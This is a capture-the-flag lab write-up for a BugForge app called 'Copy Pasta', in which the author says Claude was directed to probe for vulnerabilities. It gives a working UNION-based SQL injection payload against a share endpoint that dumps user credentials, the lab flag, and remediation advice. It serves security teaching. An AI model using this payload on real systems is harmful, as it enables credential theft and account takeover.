---
title: Copy Pasta - SQLi
tags:
  - bugforge
  - sqli
---

- Full send today - `Claude` is having a crack at this!

![](/BugForge/img/copy1.png)

- We are going for it. 
- I directed `Claude` to check for most common vulnerabilities first

## SQLi

![](/BugForge/img/copy2.png)

### Login endpoints

![](/BugForge/img/copy3.png)

### Snippet fields

![](/BugForge/img/copy4.png)

### /api/snippets/share

![](/BugForge/img/copy5.png)

### Confirmation

![](/BugForge/img/copy6.png)

### UNION-based SQLi

![](/BugForge/img/copy7.png)

## Flag

### SQL Injection Found - Full Exploitation

- Vulnerable Endpoint
```bash
GET /api/snippets/share/{share_code}
  Host: lab-1769593610952-w0y80u.labs-app.bugforge.io
```
  
- Vulnerability Type: `UNION-based SQL Injection (SQLite)`

- Proof of Concept
```bash
  GET /api/snippets/share/' UNION SELECT id,username,password,email,role,full_name FROM users--
```
  
  - Extracted Admin Credentials
  
    | Field | Value |
    |-------|-------|
    | ID | 1 |
    | Username | admin |
    | Email | admin@copypasta.com |
    | Role | admin |
    | Flag | bug{p0SvcWmBfKnwQ13LKuaMeqnykOHF6PfT} |

- Root Cause
	- The `share_code` parameter is concatenated directly into the SQL query without parameterisation.

## Security Takeaways
### Impact

  - Full database read access (all tables: users, snippets, comments, likes)
  - Credential theft and account takeover
  - Sensitive data exfiltration
  - Potential for privilege escalation via admin account compromise

### Vulnerability
  - UNION-based SQL Injection in SQLite database
  - The share_code URL parameter is directly concatenated into the SQL query
  - No input validation or parameterized queries used

### Remediation
  - Use parameterized queries / prepared statements
  - Implement input validation (UUID format for share_code)
  - Apply least-privilege database permissions
  - Hash passwords with bcrypt/argon2 (not store flags/plaintext)
